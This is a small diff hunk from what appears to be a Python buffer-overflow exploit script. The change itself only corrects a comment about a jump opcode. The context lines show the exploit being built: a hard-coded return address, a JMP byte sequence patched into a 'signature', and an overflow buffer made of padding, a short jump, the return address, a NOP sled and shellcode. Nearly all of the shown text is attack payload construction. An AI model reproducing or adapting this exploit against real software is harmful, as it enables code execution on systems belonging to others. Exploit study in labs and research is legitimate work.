@@ -71,7 +71,7 @@ ret = b"\xc3\x04\x81\x7c"
 #Add a JMP in the signature
 signature = signature.replace(b"\x78\x2e\x01\x00", b"\xeb\x3b\x00\x00")
 
-# Add another jump to reach the NOP sled \xeb\x40 <=> jmp 0x57
+# Add another jump to reach the NOP sled \xeb\x55 <=> jmp 0x57
 buffer = b"A"*4 + b"\xeb\x55" + b"A"*74 + ret + b"\x43\x43\x43\x43" + "\x90"*25 + shellcode
 
 
